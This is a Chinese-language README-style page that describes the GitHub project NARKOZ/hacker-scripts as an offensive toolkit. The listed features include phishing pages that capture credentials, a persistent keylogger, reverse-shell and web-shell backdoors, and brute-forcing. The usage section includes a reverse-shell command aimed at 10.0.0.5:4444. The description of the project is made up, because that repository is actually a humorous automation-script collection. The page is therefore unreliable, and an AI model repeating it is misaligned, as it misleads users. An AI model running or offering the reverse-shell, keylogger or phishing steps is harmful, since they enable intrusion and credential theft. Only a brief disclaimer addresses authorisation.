---
title: hacker-scripts
---

# hacker-scripts

项目地址: <https://github.com/NARKOZ/hacker-scripts>

## 简介
`hacker-scripts` 是一个集合了多种常用渗透测试与漏洞利用脚本的工具箱，旨在帮助安全研究员快速完成目标扫描、提权、后门植入等常见任务。所有脚本均以 Bash/Python/Perl 等脚本语言实现，便于在 Kali / Parrot 等渗透测试平台上直接使用。

## 主要功能
- **目标扫描**：使用 `nmap` 与 `masscan` 进行端口探测，自动生成可进一步利用的扫描报告。  
- **SQL 注入**：集成 `sqlmap`，支持自动化注入、提取数据库信息、执行命令等。  
- **暴力破解**：支持字典攻击、暴力破解 SSH、FTP、SMB、RDP 等协议。  
- **钓鱼**：提供可定制的钓鱼页面模板，并自动生成恶意站点、拦截凭证。  
- **键盘记录**：轻量级键盘记录脚本，可在目标机器上持久化收集凭证。  
- **后门植入**：一键生成并植入反向 Shell、Web Shell 等后门。  
- **信息收集**：集成 `theHarvester`、`nikto` 等信息收集工具，自动采集子域、目录、敏感信息。  
- **网络嗅探**：基于 `tcpdump`、`wireshark` 的嗅探脚本，捕获并解析网络流量。  
- **自动化流程**：通过 `workflow.sh` 脚本实现从扫描到利用的完整自动化流程。

## 用法
> **注意**：本项目仅供合法安全测试使用，未经授权请勿用于攻击行为。

1. **克隆仓库**  
   ```bash
   git clone https://github.com/NARKOZ/hacker-scripts.git
   cd hacker-scripts
   ```

2. **安装依赖**（以 Kali 为例）  
   ```bash
   sudo apt update && sudo apt install -y python3-pip
   pip3 install -r requirements.txt
   ```

3. **运行单个脚本**  
   - 扫描目标  
     ```bash
     ./scan.sh -t 192.168.1.1/24
     ```
   - SQL 注入自动化  
     ```bash
     ./sql_injection.py -u "http://target.com/page.php?id=1" -p "id"
     ```
   - 远程 Shell  
     ```bash
     ./reverse_shell.sh -h 10.0.0.5 -p 4444
     ```

4. **完整自动化流程**  
   ```bash
   ./workflow.sh -t 10.0.0.0/24
   ```

5. **自定义字典或模板**  
   - 将自定义字典放入 `dict/` 目录；  
   - 修改 `config.yaml` 中对应字段即可。

> 详细参数说明请查看各脚本顶部注释或 `docs/` 目录中的说明文件。